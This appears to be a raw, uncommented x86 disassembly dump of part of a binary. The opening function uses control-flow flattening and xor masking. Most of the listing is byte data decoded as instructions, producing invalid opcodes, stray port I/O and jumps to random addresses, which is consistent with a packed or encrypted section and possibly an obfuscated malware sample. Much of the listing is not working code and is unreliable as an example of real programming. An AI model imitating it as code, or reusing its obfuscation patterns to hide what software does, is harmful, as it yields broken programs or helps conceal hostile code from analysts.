  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x4346b7,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x4346bb,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	jl     0x409365
  409317:	inc    edi
  409318:	xchg   esi,eax
  409319:	xchg   edx,eax
  40931a:	loop   0x40939a
  40931c:	jle    0x40938e
  40931e:	jns    0x40939e
  409320:	jle    0x409368
  409322:	push   ss
  409323:	push   es
  409324:	push   ss
  409325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409326:	les    ecx,FWORD PTR [ecx]
  409328:	in     al,dx
  409329:	loop   0x409374
  40932b:	push   edx
  40932c:	jo     0x409399
  40932e:	push   ebx
  40932f:	in     eax,dx
  409330:	inc    ebx
  409331:	cmp    ebp,DWORD PTR [ecx]
  409333:	inc    esp
  409334:	jo     0x4092e4
  409336:	mov    eax,0x3a02a842
  40933b:	xor    BYTE PTR [edx],ah
  40933d:	push   ebp
  40933e:	imul   eax,eax,0x2a
  409341:	push   ds
  409342:	sub    DWORD PTR [edx],edi
  409344:	xchg   esp,eax
  409345:	push   ecx
  409346:	mov    cl,0xe1
  409348:	loopne 0x40935a
  40934a:	pop    esp
  40934b:	sbb    al,BYTE PTR [edi+edi*8-0x17]
  40934f:	pop    ebp
  409350:	mov    esp,0x3f78b3a
  409355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409356:	aam    0x16
  409358:	jnp    0x4093d6
  40935a:	adc    eax,0x69c7b8f7
  40935f:	or     DWORD PTR [eax],edx
  409361:	adc    esp,DWORD PTR [eax+ecx*1]
  409364:	dec    esp
  409365:	int3   
  409366:	je     0x409378
  409368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409369:	aaa    
  40936a:	jecxz  0x4093ce
  40936c:	sbb    DWORD PTR [ecx+edi*4],edx
  40936f:	in     al,dx
  409370:	cs adc eax,0x21965789
  409376:	dec    edi
  409377:	rcl    DWORD PTR [ebx-0x2c1a7e13],cl
  40937d:	or     eax,0xc0fdf2a8
  409382:	ret    
  409383:	mov    ebp,0x36cc8f2d
  409388:	push   ds
  409389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40938a:	imul   DWORD PTR [edx-0x59480203]
  409390:	pop    eax
  409391:	dec    edi
  409392:	jno    0x409377
  409394:	adc    esi,DWORD PTR ds:0xfb35d64c
  40939a:	into   
  40939b:	cmp    eax,0xc3b9857e
  4093a0:	sbb    BYTE PTR [ebp+0x449efd9],0xfe
  4093a7:	test   DWORD PTR [edi-0x7],edi
  4093aa:	aas    
  4093ab:	mov    eax,ds:0xc63a6028
  4093b0:	mov    edi,0x412a7333
  4093b5:	repnz enter 0xbe85,0x21
  4093ba:	inc    esi
  4093bb:	stos   BYTE PTR es:[edi],al
  4093bc:	outs   dx,BYTE PTR ds:[esi]
  4093bd:	inc    edx
  4093be:	out    dx,eax
  4093bf:	rol    BYTE PTR [ecx-0x75],0x67
  4093c3:	ret    0x5905
  4093c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093c7:	(bad)  
  4093c8:	sub    al,0x53
  4093ca:	fcomip st,st(6)
  4093cc:	out    0x91,al
  4093ce:	fiadd  WORD PTR ds:0x964c774c
  4093d4:	das    
  4093d5:	fist   WORD PTR [edx]
  4093d7:	rol    BYTE PTR ds:0xcf8e9638,1
  4093dd:	sub    al,0x80
  4093df:	sahf   
  4093e0:	test   BYTE PTR [esi+0x76],ah
  4093e3:	cmp    DWORD PTR [ebx+0x9845b8a],edx
  4093e9:	(bad)  
  4093ea:	in     eax,dx
  4093eb:	xadd   BYTE PTR [ecx-0xa],ah
  4093ef:	daa    
  4093f0:	fnsave [ebx]
  4093f2:	xor    bh,BYTE PTR [ecx]
  4093f4:	jl     0x409398
  4093f6:	pop    ebx
  4093f7:	imul   ebp,edx,0x4e947538
  4093fd:	inc    eax
  4093fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ff:	jmp    0x37153c47
  409404:	retf   
  409405:	es sbb al,0x57
  409408:	jge    0x4093f3
  40940a:	xchg   ecx,eax
  40940b:	sbb    esp,DWORD PTR [ecx]
  40940d:	or     BYTE PTR [eax],dl
  40940f:	push   0xee75e11f
  409414:	fcom   DWORD PTR [edx+edi*8]
  409417:	xchg   edx,eax
  409418:	xlat   BYTE PTR ds:[ebx]
  409419:	jecxz  0x40946a
  40941b:	lahf   
  40941c:	lods   al,BYTE PTR ds:[esi]
  40941d:	out    0x78,al
  40941f:	xchg   al,cl
  409421:	stos   DWORD PTR es:[edi],eax
  409422:	nop
  409423:	push   es
  409424:	mov    ?,WORD PTR [edi]
  409426:	mov    ebx,DWORD PTR [edi+0x6eb8c46b]
  40942c:	das    
  40942d:	shl    DWORD PTR [eax-0x30],1
  409430:	jmp    0x144c:0xa18a3b34
  409437:	das    
  409438:	inc    ebp
  409439:	cs inc ebp
  40943b:	dec    edi
  40943c:	leave  
  40943d:	mov    esi,0xc5f36c28
  409442:	into   
  409443:	push   esp
  409444:	mov    eax,0xf90bb32e
  409449:	mov    eax,ds:0x3674436a
  40944e:	mov    ebx,0xc0a33077
  409453:	mov    bl,0xeb
  409455:	pop    ecx
  409456:	fstp   DWORD PTR [edi-0x74]
  409459:	inc    edi
  40945a:	nop
  40945b:	fbld   TBYTE PTR [edi-0x25bafb70]
  409461:	fimul  DWORD PTR [eax]
  409463:	in     eax,0xeb
  409465:	rcl    DWORD PTR [ebp-0x1515867e],cl
  40946b:	sbb    edx,DWORD PTR [ecx]
  40946d:	sbb    ecx,esi
  40946f:	adc    al,0x4e
  409471:	fist   DWORD PTR [edi+0x5b]
  409474:	sti    
  409475:	cdq    
  409476:	add    dh,ch
  409478:	into   
  409479:	ins    BYTE PTR es:[edi],dx
  40947a:	mov    bh,0xe1
  40947d:	xor    al,0xad
  40947f:	cmp    al,0x71
  409481:	cmp    eax,0xe12a9cf2
  409486:	imul   eax,DWORD PTR cs:[edi],0xfffffff2
  40948a:	jmp    0xbaca:0x5d466f56
  409491:	ja     0x4094e3
  409493:	xchg   edi,eax
  409494:	cmp    al,0xaf
  409496:	ja     0x409502
  409498:	ja     0x409431
  40949a:	jb     0x4094af
  40949c:	leave  
  40949d:	sbb    cl,cl
  40949f:	mov    fs,WORD PTR [edi]
  4094a1:	pop    ebp
  4094a2:	push   cs
  4094a3:	aaa    
  4094a4:	xor    al,0x7a
  4094a6:	add    al,0x1c
  4094a8:	jecxz  0x40951b
  4094aa:	fcom   DWORD PTR [ebx]
  4094ac:	lods   al,BYTE PTR ds:[esi]
  4094ad:	jns    0x40946f
  4094af:	xor    BYTE PTR [ecx+0x7d12108d],al
  4094b5:	and    edx,ebx
  4094b7:	pop    es
  4094b8:	cmp    ebx,DWORD PTR [edx]
  4094ba:	ret    
  4094bb:	mov    esp,0xfeb2095b
  4094c0:	pop    ecx
  4094c1:	jns    0x4094ba
  4094c3:	psubw  mm6,mm6
  4094c6:	rcr    BYTE PTR [edi+0x2737487e],1
  4094cc:	fs stc 
  4094ce:	mov    dl,0x8b
  4094d0:	out    0x79,eax
  4094d2:	(bad)  
  4094d3:	ds cmp al,0x57
  4094d6:	dec    ebx
  4094d7:	push   ds
  4094d8:	jp     0x4094c0
  4094da:	pop    esp
  4094db:	jl     0x409525
  4094dd:	scas   eax,DWORD PTR es:[edi]
  4094de:	dec    esi
  4094df:	jmp    DWORD PTR [ecx+0x72c70ee6]
  4094e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094e6:	shl    BYTE PTR [eax-0x21],1
  4094e9:	stos   BYTE PTR es:[edi],al
  4094ea:	sub    eax,0x75ba7e96
  4094ef:	(bad)  
  4094f0:	clc    
  4094f1:	int3   
  4094f2:	div    BYTE PTR [eax+ebx*2-0x454434c8]
  4094f9:	ror    BYTE PTR [esi],0xa3
  4094fc:	test   BYTE PTR [ebx-0x1],ch
  4094ff:	or     al,0xc0
  409501:	push   esp
  409502:	lods   al,BYTE PTR ds:[esi]
  409503:	repnz les esp,FWORD PTR [esi+0x54761e82]
  40950a:	psubq  mm2,QWORD PTR [eax-0x50]
  40950e:	icebp  
  40950f:	dec    BYTE PTR [edi-0x1d]
  409512:	mov    bh,0xf4
  409514:	sbb    dl,BYTE PTR [edi]
  409516:	mov    eax,0xb4025ee1
  40951b:	pop    es
  40951c:	test   eax,0xaf327fd8
  409521:	cwde   
  409522:	mov    DWORD PTR [edx],edi
  409524:	repz push 0xfdd4b446
  40952a:	(bad)  
  40952b:	mov    es,ecx
  40952d:	mov    edx,0x57da2db
  409532:	out    dx,al
  409533:	lods   al,BYTE PTR ds:[esi]
  409534:	and    DWORD PTR [ecx-0x545cb445],0xffffffab
  40953b:	xchg   ecx,eax
  40953c:	out    dx,eax
  40953d:	and    BYTE PTR [ebx+0x33],dh
  409540:	shl    ch,1
  409542:	and    ch,bl
  409544:	mov    ah,bh
  409546:	pop    esp
  409547:	lock or DWORD PTR [ebx-0x25c41717],edi
  40954e:	xor    al,0xcf
  409550:	add    al,0x80
  409552:	(bad)  
  409554:	call   0xc2bc299c
  409559:	inc    esi
  40955a:	aam    0xe5
  40955c:	stc    
  40955d:	xchg   esp,eax
  40955e:	mov    al,ds:0x6a7328f
  409563:	out    dx,al
  409564:	ret    
  409565:	and    BYTE PTR [edx],dl
  409567:	adc    esi,ebx
  409569:	mov    al,0xec
  40956b:	ret    
  40956c:	jecxz  0x40956e
  40956e:	fiadd  DWORD PTR [eax+0x33]
  409571:	inc    edx
  409572:	(bad)  
  409573:	push   ds
  409574:	dec    ebx
  409575:	adc    BYTE PTR [ebx-0x5ed2ce55],dh
  40957b:	addr16 add ebp,ebp
  40957e:	push   0x30
  409580:	repnz (bad) 
  409583:	fisttp DWORD PTR [eax]
  409585:	retf   0x45fb
  409588:	out    0xb9,al
  40958a:	or     DWORD PTR [edi],edx
  40958c:	aad    0xf0
  40958e:	lods   al,BYTE PTR ds:[esi]
  40958f:	push   ecx
  409590:	lods   eax,DWORD PTR ds:[esi]
  409591:	mov    BYTE PTR [esi-0x67486212],al
  409597:	sbb    DWORD PTR [edx+0x1349fd9],esi
  40959d:	pop    ecx
  40959e:	mov    dl,0xc9
  4095a0:	lock addr16 into 
  4095a3:	aad    0x1b
  4095a5:	repz mov esp,0x6c2c3f59
  4095ab:	shl    BYTE PTR [edi+0x71],0xeb
  4095af:	push   cs
  4095b0:	shl    DWORD PTR [ebx],cl
  4095b2:	jge    0x409552
  4095b4:	adc    al,BYTE PTR [edx-0x4dd3c3f6]
  4095ba:	ins    DWORD PTR es:[edi],dx
  4095bb:	mov    edi,0xbb13369b
  4095c0:	jnp    0x4095a3
  4095c2:	pop    eax
  4095c3:	push   edx
  4095c4:	jecxz  0x4095a7
  4095c6:	inc    edi
  4095c7:	or     bh,bl
  4095c9:	(bad)  
  4095ca:	push   cs
  4095cb:	sar    BYTE PTR [ebx+edx*8+0x2e93f85d],0x18
  4095d3:	mov    eax,ds:0x46fdbe9
  4095d8:	push   ebx
  4095d9:	fwait
  4095da:	jb     0x4095ea
  4095dc:	popf   
  4095dd:	add    cl,bl
  4095df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095e0:	and    BYTE PTR [ebx],dh
  4095e2:	loopne 0x409656
  4095e4:	fs push 0xffffffbe
  4095e7:	xchg   esp,edi
  4095e9:	pop    ebx
  4095ea:	ror    BYTE PTR [ebx],0x25
  4095ed:	inc    BYTE PTR [ebx+0x31b8d013]
  4095f3:	mov    al,bl
  4095f5:	mov    ch,0x2e
  4095f7:	sbb    DWORD PTR [edi-0x66],eax
  4095fa:	mov    eax,0xf067ed94
  4095ff:	cwde   
  409600:	dec    edx
  409601:	shl    BYTE PTR [ebp-0x65b9bac9],0xd1
  409608:	sahf   
  409609:	push   eax
  40960a:	sbb    DWORD PTR [edi+0x61],eax
  40960d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40960e:	jo     0x40966c
  409610:	dec    ebp
  409611:	push   ss
  409612:	loop   0x409637
  409614:	ror    ebx,cl
  409616:	call   0xca017eb0
  40961b:	push   esp
  40961c:	add    ch,BYTE PTR [eax]
  40961e:	xor    eax,0xf841621
  409623:	pop    ebp
  409624:	inc    ebp
  409625:	loop   0x4095bd
  409627:	jae    0x40968f
  409629:	mov    ?,WORD PTR [edx+0x62c29eeb]
  40962f:	aaa    
  409630:	rcr    DWORD PTR [ebx+0x47d2a9db],cl
  409636:	adc    BYTE PTR [esi-0x61774397],0xa2
  40963d:	inc    eax
  40963e:	dec    ebx
  40963f:	cdq    
  409640:	sub    BYTE PTR [eax],dh
  409642:	gs cmp esi,ecx
  409645:	xchg   edx,eax
  409646:	xor    al,0x1f
  409648:	outs   dx,BYTE PTR ds:[esi]
  409649:	mov    ch,BYTE PTR [ebx-0x303612a8]
  40964f:	dec    ebp
  409650:	retf   
  409651:	push   cs
  409652:	fwait
  409653:	dec    eax
  409654:	cmp    BYTE PTR [ebx+0x57],al
  409657:	sbb    ah,BYTE PTR [edi-0x2b]
  40965a:	mov    bl,0xee
  40965c:	(bad)  
  40965d:	arpl   WORD PTR [ebx],bx
  40965f:	bound  ebx,QWORD PTR [ecx-0x64]
  409662:	arpl   WORD PTR [ecx+0x3a0fec8c],bx
  409668:	mov    bh,0xad
  40966a:	fs pop ecx
  40966c:	cmp    al,BYTE PTR [eax+esi*4+0x7f21c82c]
  409673:	stos   BYTE PTR es:[edi],al
  409674:	cs adc eax,0x8d787244
  40967a:	int    0xde
  40967c:	lahf   
  40967d:	push   eax
  40967e:	inc    edx
  40967f:	daa    
  409680:	or     edx,DWORD PTR [eax-0x36]
  409683:	stos   DWORD PTR es:[edi],eax
  409684:	idiv   DWORD PTR [ebx]
  409686:	push   es
  409687:	outs   dx,BYTE PTR ds:[esi]
  409688:	leave  
  409689:	fdivr  QWORD PTR [esi]
  40968b:	xor    DWORD PTR [ecx],esp
  40968d:	xchg   ecx,eax
  40968e:	xlat   BYTE PTR ds:[ebx]
  40968f:	mov    ebx,DWORD PTR [ecx]
  409691:	jno    0x4096c3
  409693:	sbb    bh,al
  409695:	(bad)  
  409696:	es pushf 
  409698:	test   BYTE PTR [ecx-0xa],ah
  40969b:	mov    esi,0x9f2ad117
  4096a0:	div    DWORD PTR [edx]
  4096a2:	pop    edi
  4096a3:	sbb    esi,esi
  4096a5:	mov    al,0x14
  4096a7:	mov    esi,0x78f7a407
  4096ac:	xchg   edx,eax
  4096ad:	fmul   DWORD PTR [eax]
  4096af:	aaa    
  4096b0:	lods   al,BYTE PTR ds:[esi]
  4096b1:	pop    es
  4096b2:	arpl   bp,di
  4096b4:	mov    ds:0x6b64b75b,al
  4096b9:	jl     0x409704
  4096bb:	pop    ebx
  4096bc:	les    eax,FWORD PTR [eax+0x3c]
  4096bf:	dec    esp
  4096c0:	push   ds
  4096c1:	push   eax
  4096c2:	push   edx
  4096c3:	pushf  
  4096c4:	xor    al,0xf7
  4096c6:	neg    DWORD PTR [eax+0x1e]
  4096c9:	repnz dec esi
  4096cb:	jmp    0xaaceba98
  4096d0:	pop    ds
  4096d1:	popa   
  4096d2:	mov    BYTE PTR [ebp+0x3baa5d2d],dh
  4096d8:	mov    esp,0x3340cee1
  4096dd:	jns    0x4096d5
  4096df:	outs   dx,BYTE PTR ds:[esi]
  4096e0:	cmp    eax,0x91698e9d
  4096e5:	mov    esi,0x3ae87b31
  4096ea:	out    0xd,eax
  4096ec:	mov    al,0x3b
  4096ee:	push   ebp
  4096ef:	adc    DWORD PTR [ecx+ebx*8],ecx
  4096f2:	inc    ebx
  4096f3:	push   0xedf09bb7
  4096f8:	cld    
  4096f9:	add    ebx,DWORD PTR [esp+eiz*2]
  4096fc:	push   edi
  4096fd:	imul   ecx,DWORD PTR [esi+0x26],0xffffffc8
  409701:	push   ebp
  409702:	xchg   ecx,eax
  409703:	sbb    dl,al
  409705:	inc    edx
  409706:	mov    ebx,0xc34d5548
  40970b:	cmp    al,BYTE PTR [ebx]
  40970d:	neg    bh
  40970f:	loop   0x40972a
  409711:	xchg   edx,eax
  409712:	xor    eax,0xcc6b4671
  409717:	(bad)  
  409718:	enter  0xa4d3,0x8b
  40971c:	inc    ebp
  40971d:	or     BYTE PTR [ebx+0x43478f3d],cl
  409723:	add    BYTE PTR [ecx],cl
  409725:	cmp    eax,0x434793
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x434673
  409745:	add    ecx,DWORD PTR ds:0x4346b7
  40974b:	mov    DWORD PTR ds:0x434673,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	(bad)  
  409768:	mov    ds:0x7e7eee94,al
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	bound  ebx,QWORD PTR [ecx+0x28]
  409774:	inc    edx
  409775:	scas   al,BYTE PTR es:[edi]
  409776:	jno    0x4097b3
  409778:	mov    esp,0x3aa67457
  40977d:	jl     0x40976d
  40977f:	push   ecx
  409780:	cmp    DWORD PTR [edx],esi
  409782:	icebp  
  409783:	mov    dl,0xc1
  409785:	jbe    0x40978b
  409787:	out    0xb6,al
  409789:	loope  0x4097e9
  40978b:	jl     0x40975d
  40978d:	xor    ecx,DWORD PTR ds:0xc492aa31
  409793:	scas   al,BYTE PTR es:[edi]
  409794:	fs data16 mul BYTE PTR fs:[edi-0x59]
  40979a:	jo     0x4097dd
  40979c:	cld    
  40979d:	mov    ah,0xce
  40979f:	test   BYTE PTR [ebx+0xf],0x31
  4097a3:	mov    edx,0x70eaa4d7
  4097a8:	das    
  4097a9:	push   ebp
  4097aa:	adc    BYTE PTR [ebp-0x4c26726f],ah
  4097b0:	mov    esp,0xc27f1474
  4097b5:	and    edx,DWORD PTR [eax+eax*8+0x4bd763a8]
  4097bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097bd:	ret    0x3940
  4097c0:	fisttp WORD PTR [ecx-0x988b20c]
  4097c6:	dec    ebp
  4097c7:	pop    ds
  4097c8:	neg    BYTE PTR [ecx+ebx*8-0x3]
  4097cc:	call   0xcc3cfcd4
  4097d1:	arpl   WORD PTR [esi-0x21],sp
  4097d4:	inc    edi
  4097d5:	sar    edi,1
  4097d7:	jae    0x40976a
  4097d9:	and    BYTE PTR [edi+eax*8],cl
  4097dc:	test   BYTE PTR [esi-0x29],dh
  4097df:	mov    al,0x41
  4097e1:	mov    WORD PTR [edx],gs
  4097e3:	outs   dx,DWORD PTR ds:[esi]
  4097e4:	pushf  
  4097e5:	xchg   ebp,eax
  4097e6:	loopne 0x409815
  4097e8:	lock mov edi,0x1020e0e8
  4097ee:	sbb    al,0x20
  4097f0:	adc    DWORD PTR [eax+0x222e2c26],ebx
  4097f6:	mov    ebx,0x9e5c3a8e
  4097fb:	rol    BYTE PTR [esi-0x15],1
  4097fe:	fisubr DWORD PTR [esi-0xa]
  409801:	pushf  
  409802:	inc    edi
  409803:	jle    0x4097dd
  409805:	popa   
  409806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409807:	ret    0x727e
  40980a:	adc    ebp,DWORD PTR [ecx-0x43c6c563]
  409810:	ins    DWORD PTR es:[edi],dx
  409811:	sub    cl,cl
  409813:	pusha  
  409814:	jmp    0x40983b
  409816:	fiadd  WORD PTR [edi-0x59c210d8]
  40981c:	popf   
  40981d:	mov    ch,0x40
  40981f:	jns    0x409846
  409821:	sbb    BYTE PTR [esi-0x7409773e],ch
  409827:	xor    DWORD PTR [edi],0x57
  40982a:	ret    
  40982b:	cmp    ebp,DWORD PTR [edx+0x57]
  40982e:	inc    ecx
  40982f:	adc    di,WORD PTR [esi+0x45ad25a1]
  409836:	jns    0x4097e6
  409838:	push   edi
  409839:	push   ebx
  40983a:	out    dx,eax
  40983b:	jl     0x4097df
  40983d:	sbb    DWORD PTR [edi-0x23],ebx
  409840:	lahf   
  409841:	pop    edx
  409842:	je     0x4097d6
  409844:	cmp    BYTE PTR [ebx-0x42],0x8d
  409848:	mov    esp,0x54d78f17
  40984d:	test   eax,0xca7bda35
  409852:	sbb    ebp,DWORD PTR [edi+0x1b65c988]
  409858:	xchg   eax,esi
  40985a:	shl    DWORD PTR [edx+0x6e667894],cl
  409860:	adc    ah,BYTE PTR gs:[ebx-0x6c]
  409864:	dec    esi
  409865:	xchg   esp,eax
  409866:	xchg   edi,eax
  409867:	stos   DWORD PTR es:[edi],eax
  409868:	xor    eax,0xa8d418d8
  40986d:	ins    BYTE PTR es:[edi],dx
  40986e:	jae    0x409816
  409870:	or     edi,eax
  409872:	mov    edi,0xf317e6b5
  409877:	push   edi
  409878:	sar    BYTE PTR [eax],1
  40987a:	adc    ecx,DWORD PTR [edx]
  40987c:	mov    ebx,DWORD PTR [esp+edi*4-0x1098abdf]
  409883:	pop    esi
  409884:	pop    ds
  409885:	out    0xb7,al
  409887:	xor    eax,0x527a67d
  40988c:	pop    edx
  40988d:	xlat   BYTE PTR ds:[ebx]
  40988e:	add    BYTE PTR [esp+eiz*4-0x68c4b54c],bl
  409895:	pop    eax
  409896:	(bad)  
  409897:	sbb    bl,dh
  409899:	fmul   QWORD PTR ds:0x68c19d3f
  40989f:	jmp    0xa32a8cf9
  4098a4:	es je  0x4098f0
  4098a7:	dec    esp
  4098a8:	xchg   ecx,eax
  4098a9:	adc    eax,0xf13e3a00
  4098ae:	scas   al,BYTE PTR es:[edi]
  4098af:	inc    edi
  4098b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b1:	test   DWORD PTR [ebx-0x43ce7b94],0x7c611b40
  4098bb:	push   cs
  4098bc:	cdq    
  4098bd:	xchg   edi,eax
  4098be:	int    0xa9
  4098c0:	inc    esi
  4098c1:	inc    esi
  4098c2:	in     al,0xe6
  4098c4:	cmp    eax,0xca7e16c
  4098c9:	es jmp 0x409875
  4098cc:	push   cs
  4098cd:	out    dx,eax
  4098ce:	xor    ah,ah
  4098d0:	or     ecx,DWORD PTR [ebx+0x69]
  4098d3:	jmp    0x116b:0xe910ce7f
  4098da:	outs   dx,BYTE PTR ds:[esi]
  4098db:	jmp    0x409861
  4098dd:	mov    ds,edx
  4098df:	cmp    esp,DWORD PTR ds:0x2af60c1b
  4098e5:	mov    al,0xa4
  4098e7:	nop
  4098e8:	push   esi
  4098e9:	data16 das 
  4098eb:	dec    esi
  4098ec:	adc    BYTE PTR [esi-0x5f],bh
  4098ef:	or     ah,BYTE PTR [edx-0x7f4f124c]
  4098f5:	data16 cmp dh,bh
  4098f8:	jl     0x409917
  4098fa:	inc    eax
  4098fb:	add    ecx,DWORD PTR [esi-0x353583d3]
  409901:	xchg   BYTE PTR [ecx+esi*4],ah
  409904:	pop    ebx
  409905:	and    edi,DWORD PTR [ebx-0x7e8c4838]
  40990b:	or     eax,0x75c76841
  409910:	stos   BYTE PTR es:[edi],al
  409911:	jmp    0xa528b45c
  409916:	(bad)  
  409917:	and    dl,bh
  409919:	adc    eax,0x57c48b24
  40991e:	mov    BYTE PTR [edi-0x80],ah
  409921:	push   esi
  409922:	pop    ds
  409923:	and    DWORD PTR [ecx-0xa],ebp
  409926:	and    ah,bl
  409928:	push   ecx
  409929:	scas   al,BYTE PTR es:[edi]
  40992a:	das    
  40992b:	pop    ss
  40992c:	out    0xf7,eax
  40992e:	ret    0x42f6
  409931:	cmp    BYTE PTR [ebx+0x73],0x54
  409935:	aas    
  409936:	shl    BYTE PTR [eax],0x49
  409939:	pxor   mm7,QWORD PTR gs:[ecx-0x188c26d7]
  409941:	fld    TBYTE PTR [ebx+esi*8+0x739dc303]
  409948:	xor    ebx,ebx
  40994a:	jbe    0x40990d
  40994c:	and    al,0xa9
  40994e:	shl    DWORD PTR [ebp+0x74],cl
  409951:	inc    eax
  409952:	(bad)  
  409953:	mov    ebp,0x59956821
  409958:	and    al,0xc9
  40995a:	call   0x11e3b80b
  40995f:	js     0x4099ca
  409961:	dec    edi
  409962:	popf   
  409963:	enter  0xdd54,0x53
  409967:	xchg   edi,eax
  409968:	cli    
  409969:	xor    BYTE PTR [ecx-0x7fa1efd6],dh
  40996f:	pop    ds
  409970:	bound  edi,QWORD PTR [ebx-0x47]
  409973:	lahf   
  409974:	into   
  409975:	aad    0xb0
  409977:	cmp    al,0xba
  409979:	dec    BYTE PTR [ebx+eax*8]
  40997c:	push   esi
  40997d:	lds    esp,FWORD PTR [esi+0x71]
  409980:	add    dl,ch
  409982:	les    eax,FWORD PTR [edx+ebx*2-0x71b97f1b]
  409989:	cli    
  40998a:	push   es
  40998b:	repz cmp eax,0xffffff86
  40998f:	call   0x74ce:0x909092dc
  409996:	aam    0xd0
  409998:	dec    ecx
  409999:	add    al,0x4b
  40999b:	call   0x2ba3:0x69be5487
  4099a2:	inc    edi
  4099a3:	shr    BYTE PTR [edi],1
  4099a5:	jbe    0x4099b9
  4099a7:	ins    DWORD PTR es:[edi],dx
  4099a8:	jne    0x409974
  4099aa:	sahf   
  4099ab:	jp     0x409956
  4099ad:	and    DWORD PTR [esi],0xa0e40411
  4099b3:	mov    BYTE PTR [eax+0x6b],0xdd
  4099b7:	pop    ebx
  4099b8:	sbb    al,0xf0
  4099ba:	pop    esp
  4099bb:	outs   dx,BYTE PTR ds:[esi]
  4099bc:	inc    edi
  4099bd:	scas   al,BYTE PTR es:[edi]
  4099be:	jno    0x40994b
  4099c0:	and    BYTE PTR ds:0x7afb51ce,ch
  4099c6:	adc    cl,cl
  4099c8:	mov    ecx,0xa844fd82
  4099cd:	xchg   ecx,eax
  4099ce:	out    0x52,eax
  4099d0:	lds    ebx,FWORD PTR [esi]
  4099d2:	iret   
  4099d3:	adc    DWORD PTR [ebx],0xada1216b
  4099d9:	jno    0x409a59
  4099db:	jmp    0xc74e01e0
  4099e0:	out    dx,eax
  4099e1:	adc    DWORD PTR [ebp-0x68],ebp
  4099e4:	mov    BYTE PTR [ebx],bl
  4099e6:	ret    0x6a36
  4099e9:	jns    0x409979
  4099eb:	ja     0x409a4f
  4099ed:	sbb    BYTE PTR [edi+0x46739011],al
  4099f3:	aaa    
  4099f4:	test   eax,0x966565a7
  4099f9:	push   esi
  4099fa:	lods   al,BYTE PTR ds:[esi]
  4099fb:	aam    0x3
  4099fd:	ja     0x409990
  4099ff:	sbb    al,0xd9
  409a01:	inc    esp
  409a02:	js     0x409a43
  409a04:	push   0xff857dd9
  409a09:	dec    ebx
  409a0a:	mov    DWORD PTR [edx-0x2b88e63e],edx
  409a10:	ret    
  409a11:	scas   al,BYTE PTR es:[edi]
  409a12:	dec    esp
  409a13:	retf   
  409a14:	mov    ds:0x73a9a7c1,al
  409a19:	and    ecx,DWORD PTR [eax-0x3f6f0353]
  409a1f:	std    
  409a20:	das    
  409a21:	sub    eax,0x876a61fd
  409a26:	xchg   esi,eax
  409a27:	dec    ebp
  409a28:	fimul  DWORD PTR ds:0x21ff3dda
  409a2e:	scas   al,BYTE PTR es:[edi]
  409a2f:	test   BYTE PTR [eax],ch
  409a31:	and    DWORD PTR [ebx-0x52182946],ebp
  409a37:	call   0x9f64d4dc
  409a3c:	sbb    al,0x3f
  409a3e:	jmp    0xee06d048
  409a43:	mov    esp,0x49e7c0a6
  409a48:	jle    0x409a62
  409a4a:	stc    
  409a4b:	lods   al,BYTE PTR ds:[esi]
  409a4c:	ret    0x322d
  409a4f:	xor    dh,ch
  409a51:	das    
  409a52:	pusha  
  409a53:	clc    
  409a54:	and    bl,ah
  409a56:	or     BYTE PTR [eax+0x4a3ada2f],0xda
  409a5d:	and    al,BYTE PTR [ebp-0x3e8e62b3]
